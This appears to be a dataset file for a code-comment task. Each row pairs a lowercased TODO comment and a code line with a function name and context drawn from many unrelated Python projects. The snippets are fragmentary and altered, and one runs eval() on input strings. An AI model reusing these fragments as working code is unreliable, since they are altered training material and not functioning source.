# todo implement. </s> return iter([])	train optimizer=RMSprop(), metrics=['accuracy'])
# todo stub </s> pass	create_catalyst def create_catalyst(self, original_df):
raise notimplementederror()  # todo </s> :param str profile_name: the name of the profile.	set_active_profile Not implemented yet!
# todo: more efficient implementation (lua script per shard?) </s> for channel in channel_names:	RedisChannelLayer await connection.zrange(key, 0, -1) ] try: await self.send(channel, message)
# todo: wobble </s> gast = sidereal_time(jd, use_eqeq=true)	ITRF_to_GCRS ]) return einsum('i...,ij...->j...', vector, rotation) position = spin(-gast * TAU / 24.0, array(rITRF)) position = array(position)
# todo: implement this </s> class opts(object):	Opts def __init__(s): s.format_map = self.FORMATS
# todo materials are read-only for now </s> return mo	create if opplanreslist: self._processOperationPlanResource(mo, opplanreslist)
# todo i18n text entries </s> for entry in setting.choices:	_create_choice_control _write_async(s, cbbox.get_active_id(), cbbox.get_parent()) c = Gtk.ComboBoxText() c.append(str(entry), str(entry)) c.connect('changed', _combo_notify, setting)
# todo implement for all channels </s> def _handle_toggle(self, message):	_handle_toggle return None
# todo: remove </s> page_pk = request.get.get(page_var, none)	paginate def paginate(request, query_set, lookup_field, per_page=15, page_var='value'): paginator = SeekPaginator(query_set, per_page=per_page, lookup_field=lookup_field) if page_pk is None:
# todo(b/142684737): the multi-processing api might change. </s> beam_pipeline_args=['--direct_num_workers=%d' % direct_num_workers],	_create_parameterized_pipeline ], enable_cache=enable_cache,
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# todo: must be implemented </s> pass	get_range_using_index def get_range_using_index(self, chapter_count):
# todo-blocker(jamalex): re-enable this conditional once tastypie endpoints invalidate cached session value </s> request.session["points"] = compute_total_points(user)	status data["is_logged_in"] = True data["username"] = user.get_name() data["points"] = request.session["points"] data["user_id"] = user.id
# todo get variable size </s> val = frame.evaluateexpression('*(void**)' + addr)	generate_return_string name += '\n' + ('0x%010x' % val.unsigned) else: name += '\n' + (val.description if val.description else '0x%010x' % val.unsigned) elif symbol_context.function.name is not None:
#todo: test me </s> self.velocity = self.velocity + j * self._body.contents.m_inv	apply_impulse def apply_impulse(self, j, r): world coordinates.""" self._body.contents.w += self._body.contents.i_inv* r.cross(j)
# todo: wobble </s> return einsum('i...,ij...->j...', vector, rotation)	spin ])
assert self.start_seq is none #todo: better handling of this situation </s> assert self.stop_seq is none #todo: better handling of this situation	stop_program def stop_program(self): L.debug("Initializing stop sequence") self.stop_seq = sequence_controller()
# todo(unno): sub for boolean array is deprecated in numpy>=1.13 </s> self.check_array_broadcasted_op(operator.isub, no_bool=true)	test_broadcasted_isub @testing.with_requires('numpy>=1.10') def test_broadcasted_isub(self):
# todo: check how to sort inputs for multichannel inputs </s> sim = pyverilator.build(	execute_node inp = inp.transpose(0, 2, 3, 1) inp = inp.flatten() verilog_file, verilog_path=[
# todo: find out if this method is used anywhere, remove if not. </s> return rval	get_monitor model.monitor = rval
# todo: self.assertfalse(prop.is_valid(np.bool8(true))) </s> self.asserttrue(prop.is_valid(np.int8(0)))	test_Int try: import numpy as np self.assertTrue(prop.is_valid(np.int8(1))) self.assertTrue(prop.is_valid(np.int16(0)))
# todo: handle case where the creation is rejected for some reason (should </s> assert 'request_id' in create_response	CrushNodeViewSet if serializer.is_valid(request.method): create_response = self.client.create(fsid, CRUSH_NODE, serializer.get_data()) return Response(create_response, status=status.HTTP_202_ACCEPTED) else:
# todo: legacy behavior, should remove after new case processing </s> if xform._id not in case_doc.xform_ids:	get_or_update_cases case_doc = _get_or_update_model(case_block, xform, case_db) if case_doc: case_doc.xform_ids.append(xform.get_id) case_db.set(case_doc.case_id, case_doc)
# todo: revert this pushing all 3 changes at once, its' just a </s> self._clone.push_abandoned(	remove self.review_branch_name(), self._tracking_branch.base) self._review_branch.branch, self._tracking_branch.branch)
# todo - use smarter weights (e.g. hamming window) </s> k[indices] += 1	slide indices = resolution.crop(chunk, mode=self.alignment, fixed=fixed) data[indices] += fX_ data = data / np.maximum(k, 1) return SlidingWindowFeature(data, resolution)
# todo handle custom_objects </s> self.model = dict_to_model(serialized_model)	__init__ def __init__(self, serialized_model, parameter_server_mode, train_config, frequency, master_optimizer, master_loss, master_metrics, custom_objects): if parameter_server_mode == 'http': self.client = HttpClient()
# todo take this as input from outside? </s> minv = {}	_computeMasterSupports deltaWeights = [] locations = self.locations maxV = {} for l in locations:
# update new ratings kodi 17 - todo get ratingid for updates from embydb </s> if self.kodi_version > 16:	add_update total = round(float(runtime), 6) self.kodi_db.add_playstate(fileid, resume, total, playcount, dateplayed) ratingid =  self.kodi_db.create_entry_rating() self.kodi_db.add_ratings(ratingid, movieid, "movie", "default", rating, votecount)
# todo: we do not currently have type-safety for keys suitable for decoding *and* </s> options = {"verify": true}	decode this to ``False`` to disable verifying the audience. :param algorithms: The algorithms which should be tried to verify the payload. kwargs = dict() if audience is False:
# todo: remove when support for django 1.3 is dropped </s> except attributeerror:	get_real_content_type try: ct = cts._get_from_cache(opts) key = (opts.app_label, opts.object_name.lower()) return cts.__class__._cache[cts.db][key]
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
raise notimplementederror # todo </s> def earliest_offset(self):	earliest_offset
# todo: let the globe return the semimajor axis always. </s> a = np.float(self.globe.semimajor_axis or wgs84_semimajor_axis)	Geostationary globe=globe, sweep_axis=sweep_axis) b = np.float(self.globe.semiminor_axis or a) h = np.float(satellite_height)
summary=f'added book "{b.title}"', # todo shelf? </s> eid=b.id	events yield Event( dt=b.date_added,
# todo: must be implemented </s> pass	range_from_chapters def range_from_chapters(crawler, times=0):
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
"""todo doc me""" </s> def types(table):	types
""" type setting - todo explain """ </s> return discovery['changeset']	get_changeset def get_changeset(self,obj):
# todo, pass complete checkpoint as state dictionary </s> self.mp_queue.put(best_model_path)	__transfer_distrib_spawn_state_on_fit_end last_path = re.sub(".ckpt", ".tmp_end.ckpt", best_model_path) self.checkpoint_io.save_checkpoint(state_dict, last_path) self.mp_queue.put(last_path) self.mp_queue.put(results)
pass # todo </s> else:	_help def _help(self, args): if args == None: pass # TODO
# todo: fix inconsistent handling of water </s> special_symbols = {"d": "d", "hw": "h", "ow": "o", "wat": "o",	_get_structure def _get_structure(self, data, primitive): Generate structure from part of the cif. "wat": "O", "OH": "", "OH2": ""} elements = [el.symbol for el in Element]
# todo : map extra parents to the extras file </s> pass	import_git_commit p2 = self._map[sha] if len(commit.parents) > 2: files = commit.getfiles() extra = {}
# todo(mordred) when this changes to rest, force interface=admin </s> with _utils.shade_exceptions(	update_endpoint if service_name_or_id is not None: kwargs['service'] = service_name_or_id "Failed to update endpoint {}".format(endpoint_id) ):
# todo (a8): add user to models </s> setattr(result, 'user', none)	obj_get result.branch = result.revision.branch setattr(result, 'result', result) return result
# todo(yuriyz): change to 404 (bug 1200517) </s> self.assertequal(response.status_int, 500)	test_update_not_found response = self.patch_json('/ports/%s' % uuid, {'extra': {'a': 'b'}}, expect_errors=True) self.assertEqual(response.content_type, 'application/json') self.assertTrue(response.json['error_message'])
# todo context, etc (allophones) </s> self.labels["data"] = sorted(self.lexicon.phonemes.keys(), key=lambda s: self.lexicon.phonemes[s]["index"])	LmDataset self.lexicon = _Lexicon(lexicon_file) self.orth_symbols = None if orth_replace_map_file: orth_replace_map = load_json(filename=orth_replace_map_file)
# todo: restore this code after resolution of the following issue: </s> if not (isinstance(data, ma.maskedarray) and	extend_circular_data coord_slice_in_cube = [slice(None)] * data.ndim coord_slice_in_cube[coord_dim] = slice(0, 1) not isinstance(data.mask, np.ndarray)) or \ len(data.mask.shape) == 0:
# todo: does the gas and from defaulting in `sendtransaction` make sense for this? </s> return self.sendtransaction(new_transaction)	modifyTransaction self.web3, current_transaction, new_transaction )
svg = apply_template(svg, {"maxpoints":maxpoints, "trdn": trdn, "msg":"", "valuemid":"0.5", "timemid":"10s", "datapoints":"","init_max_y": "false", "max_y": 0, "seconds_scale":0, "y_shift": 0, "zero": 0, "l_y":"[0,0,0,0,0,0,0,0,0,0]"}) # todo templating engine </s> else:	plotwh print "GENERATE_ERROR" traceback.print_exc() svg = apply_template(svg, {"MAXPOINTS":MAXPOINTS, "TRDN": trdn, "MSG":"", "VALUEMID":"0.5", "TIMEMID":"10s", "DATAPOINTS":"","INIT_MAX_Y": "false", "MAX_Y": 0, "SECONDS_SCALE":0, "Y_SHIFT": 0, "ZERO": 0, "L_Y":"[0,0,0,0,0,0,0,0,0,0]"}) # TODO templating engine if width and height: svg = svg.replace('height="210" width="610"', 'height="%s" width="%s"' % (height, width)) # TODO: switch to templating
# todo: remove patch and update test once calculation_magic is implemented </s> @mock.patch("sentry.tasks.low_priority_symbolication.calculation_magic", lambda x, y: true)	test_is_eligible_in_lpq @freeze_time(datetime.fromtimestamp(0)) def test_is_eligible_in_lpq(self, store) -> None: store.add_project_to_lpq(17)
# todo: delet this when all preprintproviders have a mapping </s> allowed_parents = [id_ for sublist in provider.subjects_acceptable for id_ in sublist[0]]	PreprintProviderSubjectList return provider.subjects.filter(parent___id=parent) else: allows_children = [subs[0][-1] for subs in provider.subjects_acceptable if subs[1]] return [sub for sub in Subject.find(MQ('parent___id', 'eq', parent)) if provider.subjects_acceptable == [] or self.is_valid_subject(allows_children=allows_children, allowed_parents=allowed_parents, sub=sub)]
).consume()  # todo see issue 170 </s> aws_update_tag=aws_update_tag,	load_ec2_instance_network_interfaces GroupId=group["GroupId"],
# todo: sort out blending on non-rgb systems </s> new_char = " "	update x, y, fg, attr, bg = last[1], last[2], last[3], last[4], last[5] if self._blend: else: new_char = " "
#todo: fix this </s> return [ self[name] for name in self ]	values def values( self ): "return a list of all nodes or net's values"
# todo: make a signature attribute for transactions </s> if self._transaction is not none \	_process_command db.time = now sig.check_arity(fields[1:]) and func_name not in ('exec', 'discard', 'multi', 'watch'): self._transaction.append((func, sig, fields[1:]))
# todo!! add more assertions for the smaller subsystems </s> def test_complexes(standard, flushdb):	test_complexes complexes = list(compute.complexes(standard)) assert standard_example_is_correct(complexes[7])
# todo todo todo </s> pass	set_mouse_cursor def set_mouse_cursor(self, cursor):
# todo: the following skipped suite and fixtures should be enabled </s> @pytest.fixture(autouse=true)	skip_suite def skip_suite(self, request): if request.node.get_marker('ext_suite_1'):
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: either fix this or remove this code </s> return rating.rating_images[0]	_get_rating_pixbuf Returns the pixbuf for the rating of the tracks if they're identical If they're not, returns a pixbuf for the rating 0 if not tracks: tracks = self._get_tracks()
pass  # todo(zcd) </s> def test_check_forward_backward(self):	test_check_forward_backward
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_run_json.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_json memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task_run.json' % name)
# todo: move navigation part to base class </s> self.mousepos = event.pos()	mouseMoveEvent def mouseMoveEvent(self, event): mouseDelta = QtCore.QPointF(self.mousePos) - self._lastMousePos modifiers = event.modifiers()
#todo gtk3: workaround here for bug https://bugzilla.gnome.org/show_bug.cgi?id=680638 </s> self._widget.drag_dest_set_target_list(tglist)	ClipboardListView self._widget.enable_model_drag_dest([], Gdk.DragAction.COPY) self._widget.connect('drag-data-get', self.object_drag_data_get) self._widget.connect('drag-begin', self.object_drag_begin)
# todo: use tx hash instead of key to avoid multiple queries for the same tx </s> utxo_key_ids = list(set([utxo.key_id for utxo in utxos]))	scan if account_id is not None: utxos.filter(DbKey.account_id == account_id) for key_id in utxo_key_ids: self.utxos_update(key_id=key_id)
# todo test </s> def _state_reachable(state, tpm):	_state_reachable test = tpm - state return np.any(np.logical_and(-1 < test, test < 1).all(1))
# todo: log. </s> continue	download_all methods = self.unknown_method(dresponse) except NoData: request = self.create_getdatarequest( {dresponse.provider: files}, methods, info
# todo: add other exceptions here </s> return false	send msg.set_system_error(SMS.ERROR_INVALID_DESTINATION_NUMBER)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_hashes_contents_invalid def test_fail_hashes_contents_invalid(self):
#todo(wwolf) get correct value for these </s> "updated": "2011-7-18t11:30:00z",	dispatch "id": "v1.1", "status": "CURRENT", }, {
# todo. create readme file in <output_dir> </s> step = arguments['--step']	main output_dir = Path(arguments['<output_dir>']) output_dir = output_dir.expanduser().resolve(strict=False) if step is not None: step = float(step)
extruder_stack.userchanges.setproperty(key, "value", new_value)  # todo: nested property access, should be improved </s> if extruder_stack != self._active_container_stack and extruder_stack.getproperty(key, "value") != new_value:	copyAllValuesToExtruders for extruder_stack in extruder_stacks:
# todo(harlowja): the bug 1214083 is causing problems </s> log.debug(_("%(flow)s has moved into state %(state)s from state"	flow_log_change def flow_log_change(state, details): " %(old_state)s") % {'state': state, 'old_state': details.get('old_state'),
heading=x.heading, # todo include the rest? </s> tags=list(x.tags),	_iterate yield OrgNote( created=created,
# todo: maybe a chardet integration </s> return cls.default_encoding	detect_encoding file_descriptor.seek(len(bom)) return encoding
# todo: replace with a call to dt.timestamp() when we drop python 2.7 </s> return str(calendar.timegm(dt.utctimetuple()))	_format_token return str(int(dt.microsecond / 100000)) if token == "X": if token == "x": ts = calendar.timegm(dt.utctimetuple()) + (dt.microsecond / 1000000)
# todo use **kwargs instead 4 dummy parameters </s> return super(telegramclient, self).connect(	connect def connect(self, a=None, b=None, c=None, d=None): device_model=self.device_model, system_version=self.system_version,
# todo assert the key passes deeper validation </s> key = 'rsa1024:' + ''.join(r.strip().split('\n')[1:-1])	epilogue if not r.startswith('-----BEGIN RSA PRIVATE KEY-----\n'): raise Exception('%s does not have the right format!') else: log.err('The structure of %s is incorrect. Cannot load onion service keys' % TOR_DIR)
# todo: refactor into some kind of utility </s> self.mock_app.reset_mock()	tearDown shutil.rmtree(self.temp_dir)
fp = open("%s.py" % name, "w")   # todo: confirm file overwrite </s> print >>fp, pipe2py.compile.parse_and_write_pipe(	test_submodule_loop pipe_def = self._get_pipe_def(pipe_file) try: self.context, pipe_def, pipe_name=name) fp.close()
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	init_host def init_host(self, host):
tasks = ss("#todo-list>li") </s> def add(*tasktexts):	add for text in taskTexts: s("#new-todo").send_keys(text, Keys.ENTER)
# todo unordered float </s> if a is none and b is none:	fcomi def fcomi(ir, instr, a=None, b=None): a, b = float_st0, float_st1 elif b is None:
# todo: uncomment when notificationsubscription is implemented </s> return self	register self.update_search() self.update_search_nodes()
# todo: make this a hard error, instead of a silent overwrite </s> logging.warning("kvm: overriding disk_cache setting '%s' with 'none'"	_GenerateKVMRuntime if instance.disk_template in constants.DTS_EXT_MIRROR: if disk_cache != "none": " to prevent shared storage corruption on migration", disk_cache)
# todo: parallelize the following loop with joblib </s> for doc in raw_documents:	_build_vectors def _build_vectors(self, raw_documents): term_counts_per_doc = [] term_count_dict = {} # term => count in doc for term in self.analyzer.analyze(doc):
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
self.assertequals(status, 200) # todo: 202 when asynchronous </s> status, body = self.post(path, body)	test_uninstall options=options,)
if abs(skew) > 5: # todo: make configurable </s> self.setmessage('date', rs.date_incorrect, clock_skew_string=relative_time(	checkCaching skew = self.response.parsed_hdrs.get('date', 0) - \ self.response.header_timestamp + self.response.parsed_hdrs.get('age', 0) self.response.parsed_hdrs.get('date', 0), self.response.header_timestamp, 2)
# todo: automate this: batch in -> batch out; time in -> time out; batch+time in -> batch+time out, etc.. </s> state_value._batch_rank = 0 if self.input_space.time_major is false else 1	_graph_fn_get_state_values_and_logits flat_logits._time_rank = 0 if self.input_space.time_major is True else 1 logits = self.call(self.reshape.apply, flat_logits) logits._batch_rank = 0 if self.input_space.time_major is False else 1 if self.input_space.has_time_rank:
# todo: what about other auth types? </s> auth_hdrs = urllib3.make_headers(proxy_basic_auth=mgr.proxy.auth)	_init_con_pool mgr = urllib3.proxy_from_url(proxy_url, **kwargs) if mgr.proxy.auth: mgr.proxy_headers.update(auth_hdrs) _CON_POOL = mgr
# todo(kpy): remove support for legacy urls in mid-january 2012. </s> assert not useractionlog.all().get()	test_note_status 'Not authorized', 'believed_dead')
# todo: we have no format to save volumes yet! </s> raises(valueerror, imageio.imsave, fname2, np.zeros((100, 100, 5)))	test_functions assert vols[0].shape == vol.shape raises(ValueError, imageio.mvolsave, dname4, vols) raises(ValueError, imageio.imsave, fname2, 42) raises(ValueError, imageio.mimsave, fname5, [np.zeros((100, 100, 5))])
# todo(hub-cap): turn this into middleware </s> context = context.reddwarfcontext(	index def index(self, req, tenant_id): auth_tok=req.headers["X-Auth-Token"], tenant=tenant_id)
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	init_host def init_host(self, host):
raise notimplementederror #todo </s> def __call__(self, doc):	__call__
# todo: replace with `keras.backend.pad` </s> return tensorflow.pad(x, paddings, mode="constant")	pad_bounding_boxes difference = keras.backend.max([0, difference]) paddings = ((0, 0), (0, difference), (0, 0))
# todo: fix this </s> if hreference.split("/")[-1] == item.href:	report else: not_found_props.append(element) uri = "/" + hreference else:
# todo(cmaloney): switch to a sane http server </s> def wsgi_app(env, start_response):	wsgi_app subscriber.handle_event(json.load(env['wsgi.input'])) start_response('200 OK', [('Content-Type', 'text/html')])
# todo this should be a return and printed elsewhere </s> print('area under roc curve (auc): %0.2f' % area)	roc_curve fpr, tpr, thresh = skmetrics.roc_curve(true_values, predictions) area = skmetrics.auc(fpr, tpr) d = (fpr - 0) ** 2 + (tpr - 1) ** 2 ind = np.where(d == np.min(d))[0]
# todo: needs further implementation </s> rows = recappassageonedata(config=self.config).rows	calculate_rows def calculate_rows(self): return rows
# todo: wait for event instead. </s> sublime.set_timeout_async(	ApplyWorkspaceEditCommand if view: if view.is_loading(): lambda: view.run_command('apply_document_edit', {'changes': file_changes}), 500
# todo: convert non uris to file uris. </s> for line in data.readlines():	parse_m3u def parse_m3u(data): if not line.startswith('#') and line.strip(): yield line
#todo - two staight lines is only a good approximation for small </s> p.lineto(x0+middle_radius*endsin, y0+middle_radius*endcos)	_draw_arc_arrow reverse=True) p.lineTo(x0+outer_radius*headsin, y0+outer_radius*headcos) p.lineTo(x0+inner_radius*headsin, y0+inner_radius*headcos) p.closePath()
# todo(kevinbenton): remove after bug/1666493 is resolved </s> if subnet['id'] != ipam_subnet.subnet_manager.neutron_id:	add_auto_addrs_on_network_ports def add_auto_addrs_on_network_ports(self, context, subnet, ipam_subnet): raise RuntimeError( "Subnet manager doesn't match subnet. %s != %s"
# todo xxx postremora: uncomment when remora goes away </s> self.user_profile.save()	TestRegistration self.user_profile.confirmationcode = "code"
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
#todo finish me </s> return figshare_hgrid_data(node_settings, auth, none, contents=false, **data)	figshare_dummy_folder parent = data.pop('parent', 'null')
# todo should we pass? </s> pass	trim_outdated_cached_data except sqlite3.Error as err: _log.debug("Unable to remove old data from table ?: ?", table, err)
# todo: add parameters to supply to integratedgradients.attribute? </s> outputs = visualizer.visualize()	test_multi_features score_func=None, ) for output in outputs: contribs = torch.stack(
# todo: consider returning an empty [] rather than raising </s> assert_raises(attributeerror, keyed_tuple.keys)	test_values_but_no_labels eq_(str(keyed_tuple), '(1, 2)') eq_(keyed_tuple.__dict__, {}) assert_raises(AttributeError, keyed_tuple._asdict) def should_raise():
#todo fixme: we should provide an option to create the page </s> else:	procesPage if not item.exists(): pywikibot.output('%s doesn\'t have a wikidata item :(' % page) pagetext = page.get() templates = pywikibot.extract_templates_and_params(pagetext)
# todo: something a bit less heavy than eval </s> terms = eval(terms)	run if isinstance(terms, basestring): if '{' or '[' in terms: terms = [ terms ] return flatten(terms)
# todo ... </s> if isinstance(token, copeningbracket):	cpre3_parse state = 0 elif state == 10: # typedef curCObj._bracketlevel = list(token.brackets) state = 11
# todo: implement </s> pass	_parse_cabocha def _parse_cabocha(result: str):
# todo: convert to casetransaction object </s> case_action = commcarecaseaction.from_parsed_action(	_get_case_action_intents )) else: submit_time, user_id, xform, AbstractAction(CASE_ACTION_COMMTRACK) )
if not is_checksum_address(checksum_address):  # todo: more? </s> raise runtimeerror("invalid certificate checksum address encountered: {}".format(checksum_address))	_write_tls_certificate pseudonym = certificate.subject.get_attributes_for_oid(NameOID.PSEUDONYM)[0] checksum_address = pseudonym.value if host and (host != common_name_on_certificate): raise ValueError('You passed a hostname ("{}") that does not match the certificat\'s common name.'.format(host))
# todo remove .as_posix when requiring python 3.6 </s> for f in os.listdir(dir_name.as_posix()):	_read_cell_data dir_name = pathlib.Path(filename).resolve().parent basename = os.path.splitext(os.path.basename(filename))[0] out = re.match("{}_([^\\.]+)\\.xml".format(basename), f) if not out:
# todo(ivanlei): should score the vt results here and only add them if they're interesting </s> self._threat_info_by_iocs[domain] = self._trim_domain_report(domain, reports[domain])	_lookup_iocs reports = vt.get_domain_reports(self._all_iocs) for domain in reports.keys():
# todo: weather data source changed, temporarily disable, will enable it later when new data source is available. </s> self._trip_reader = binaryreader(self._conf["trip_data"])	_init if not os.path.exists(trip_data_path): self._build_temp_data() self._trip_start_date: datetime.datetime = self._trip_reader.start_datetime self._trip_start_date = self._trip_start_date.astimezone(self._time_zone)
#todo fix this </s> data = {'action': args['action']}	Main data['library'] = args['library'] elif args['action'] in ['rate', 'unrate']: media_type = None if 'media_type' in args and 'dbid' in args:
# todo save the error to the plugin </s> plugin_db_setting.save()	_init_plugins if not settings.PLUGIN_TESTING: plugin_db_setting.active = False settings.INTEGRATION_PLUGINS_INACTIVE[plug_key] = plugin_db_setting continue  # continue -> the plugin is not loaded
# todo: changing 'detailpage' to 'embedded' allows age-restricted content </s> url = 'https://www.youtube.com/get_video_info?html5=1&c=tvhtml5&cver=6.20180913&el=detailpage&video_id=' + vid	youtube_get_old_endpoint def youtube_get_old_endpoint(vid): r = requests.get(url) if not r.ok:
# todo this closure is ugly. it also doesn't work with </s> module = self._parser.module()	get_completions def get_completions(user_stmt, bs): names, level, only_modules = helpers.check_error_statements(module, self._pos) completions = []
# xxx todo: is there a better approach to handle the absense of a </s> app.config['whoosh_base'] = 'whoosh_index'	_create_index def _create_index(app, model): if not app.config.get('WHOOSH_BASE'): wi = os.path.join(app.config.get('WHOOSH_BASE'), model.__class__.__name__)
# todo: update authors' num_sounds (when not handled via trigger) </s> if self.pack:	change_moderation_state if not do_not_update_related_stuff and commit: if (current_state == 'OK' and new_state != 'OK') or (current_state != 'OK' and new_state == 'OK'): self.pack.process() else:
# todo(remove this when 11.6.1 is no longer supported) </s> tmos_v = self._meta_data['bigip']._meta_data['tmos_version']	create def create(self, **kwargs): tmos_v = LooseVersion(tmos_v) if tmos_v < LooseVersion('11.6.0'):
# todo: support negative indexes </s> if index < 0:	insert_at_index def insert_at_index(self, index, value): raise IndexError new_node = ListNode(value)
# todo: this is just an example filter. </s> filters = filters or {}	available_backends def available_backends(self, filters=None): backends = self.backends if 'local' in filters and not filters['local']: backends = {}
# todo: this really shouldn't be in this class </s> current_time = time()	getDateCompleted @pyqtSlot(int, result = str) def getDateCompleted(self, time_remaining: int) -> str: completed = datetime.fromtimestamp(current_time + time_remaining) today = datetime.fromtimestamp(current_time)
# todo 目前仅在 华泰子类 中实现 </s> start_date, end_date = helpers.get_30_date()	exchangebill 默认提供最近30天的交割单, 通常只能返回查询日期内最新的 90 天数据。 :return: return self.get_exchangebill(start_date, end_date)
# todo: set n_chunks to 1 when signals.shape[1] is small enough </s> n_chunks = 20	_mean_of_squares But uses a lot less memory. var = np.ndarray(signals.shape[1]) chunk_size = max(signals.shape[1] // n_chunks, 1) n_chunks = (signals.shape[1] - 1) // chunk_size + 1
# todo reenable </s> for v in []:#first_values:	get_params m = _error_argument_count(func, len(unpacked_va)) first_key, first_values = remaining_params[0] if first_key is not None: v = v.parent
#todo wrap the lp api or use library </s> owner, ppa = url.split('/')[3:5]	process_data if not key_fingerprint: try: lp_url = 'https://launchpad.net/api/beta/~%s/+archive/%s' % (owner, ppa) req =  Request(lp_url)
# todo: improve error message(add error code) </s> msg = (	data_for_create wrap_quotes = lambda op: "'" + op + "'" op_list =list(map(wrap_quotes, create_ops)) "Expected data of form " + "{" + ": [..], ".join(op_list) + ": [..]}"
#todo would be better to log.exception here </s> err_msg = "transcoding failed: %s. " % e	transcode_to_mp3 raise OSError  # handle errors in except except OSError as e: if err_output is not None: err_msg += "stderr: '%s'" % err_output
# todo #1497 #1358 </s> receipt = self.staking_agent.set_snapshots(staker_address=self.checksum_address, activate=value)	_set_snapshots @save_receipt def _set_snapshots(self, value: bool) -> TxReceipt: return receipt
# todo: encode data ids and decode ids. </s> params = util.params(inputs, sanitize=false)	_create inputs[k] = v self._patch_library_inputs(trans, inputs, target_history) incoming = params.__dict__ use_cached_job = payload.get('use_cached_job', False) or util.string_as_bool(inputs.get('use_cached_job', 'false'))
# todo: clarify variable names </s> for (nam2, int2) in list(system.interfaces.items()):	write_v6_config host = system.interfaces[interface["interface_master"]]["dns_name"] if ip_v6 is None or ip_v6 == "": if nam2.startswith(interface["interface_master"] + ".") \ and int2["ipv6_address"] is not None \
# todo(b/155239129): used list_physical_device in `setup` for gpu tests. </s> self.assertequal(result, 10)	test_execution_of_tensorflow result = comp()
# todo data alignment stuff </s> if 'byteoffset' in pyaccessor.json.keys():	read fmt = '<' + (fmt_char * component_nb) stride = struct.calcsize(fmt) offset = pyaccessor.json['byteOffset'] #TODO use pyaccessor.byteOffset else:
""" only show the top todo. """ </s> todolist = todolist([	test_list49 def test_list49(self): "This item is hidden h:1", "This item is visible",
#todo: fix this. </s> self._static = none	_rebuild self.listener.pause() try: self.build() except Exception, e:
# todo(dcramer): we need create a public api for 'sort_value' </s> context = serialize(list(group_list), request.user)	put if group_list: GroupMeta.objects.populate_cache(group_list) return Response(context) return Response(status=204)
# todo: fix inconsistent handling of water </s> special_symbols = {"d": "d", "hw": "h", "ow": "o", "wat": "o",	_get_structure def _get_structure(self, data, primitive): Generate structure from part of the cif. "wat": "O", "OH": "", "OH2": ""} elements = [el.symbol for el in Element]
""" type setting - todo explain """ </s> return discovery['key_service']	get_key_service def get_key_service(self,obj):
pass  # todo </s> "draw triangle from start to end."	triangle def triangle(start, end):
# todo also test these! </s> continue	test_classifiers continue if Clf in [MultinomialNB, BernoulliNB]: clf = Clf() clf.fit(X, y)
# todo: log exception </s> continue	scan hit = yararules.match(data=f.read()) except Exception as e: finally: f.close()
from gi.repository import glib  # todo: to fix </s> import gi	getResult else: self.updateConversionAddressingTableWithTable(filterConversionAddressingTable) gi.require_version('Gtk', '3.0') encodedResult.append(glib.markup_escape_text(newData))
# todo: check return value of attachthreadinput properly </s> win32functions.setforegroundwindow(self)	SetFocus if cur_fore_thread != control_thread: win32functions.AttachThreadInput(cur_fore_thread, control_thread, win32defines.TRUE) win32functions.AttachThreadInput(cur_fore_thread, control_thread, win32defines.FALSE) else:   # same threads - just set the foreground window
# todo add verbose output </s> return self._domain	LocalizationModel @property def domain(self): @domain.setter def domain(self, new_domain):
# todo: make truly async </s> self._resourcemanager_client = discovery.build('cloudresourcemanager', 'v1', cache_discovery=false, cache=memorycache())	__init__ def __init__(self):
# todo: what happens to sysex messages? </s> value = event.message	_parse if num_events == 1: event = buffer[0] while value: byte = value & 0xff
# todo handle second-order transitions (trigrams) </s> def _count_trans(y, start, end, n_classes):	_count_trans Parameters ----------
# todo: fix this case with correct thresholding </s> evaluator = evaluator(model, dataset, [])	test_gc_binary_kappa_classification dataset = dc.data.NumpyDataset(X, y) model = dc.models.GraphConvModel(1, mode="classification") multitask_scores = evaluator.compute_model_performance( dc.metrics.kappa_score, n_classes=2, threshold=True)
# todo remove set! duplicates should not be normal </s> comp_str = str(sorted(set([str(c) for c in completions])))	run_completion_test return 1 else: if comp_str != correct: print('Solution @%s not right, received %s, wanted %s'\
#todo really dereference item? (sample pipe seems to suggest so: surprising) </s> key = reduce(lambda i,k:i.get(k), [item] + dk['subkey'].split('.')) #forces an exception if any part is not found	pipe_itembuilder try: if "subkey" in dk: else: key = dk['value']
d.addcallback(self.failunlessisbardottxt) # todo: check headers </s> return d	test_GET_FILEURL_named u_url = base + "?save=true&filename=" + u_fn_e d.addCallback(lambda res: self.GET(u_url))
# todo: use slotssequenceelement to render this. </s> return ""	problems_p return tag
# todo - is there a less expensive way to get these from the database </s> context['to_order'] = [part for part in part.objects.filter(purchaseable=true) if part.need_to_restock()]	get_context_data context = super(TemplateView, self).get_context_data(**kwargs) context['starred'] = [star.part for star in self.request.user.starred_parts.all()] context['to_build'] = [part for part in Part.objects.filter(buildable=True) if part.need_to_restock()] return context
"""todo: is this function deprecated? </s> :param obj:	updateObject def updateObject(obj, fix = False): :param fix: notifications = []
#todo: we also need to account for presto/groups/comps metadata </s> pulp.server.util.create_repo(repo_path, checksum_type=repo["checksum_type"])	remove_packages if not os.path.exists(repo_path): os.makedirs(repo_path)
os.remove(zip_path) # todo: caching (at least for the public version?) </s> return response	download response["Content-Disposition"] = \ "attachment; filename={0}.zip".format(article.slug)
#todo resend message + throttling </s> generated_token = totp(token.seed)	verify_computer token = user.token if token.method in ('call', 'sms'): if token.method == 'call': call(to=token.phone, request=request, token=generated_token)
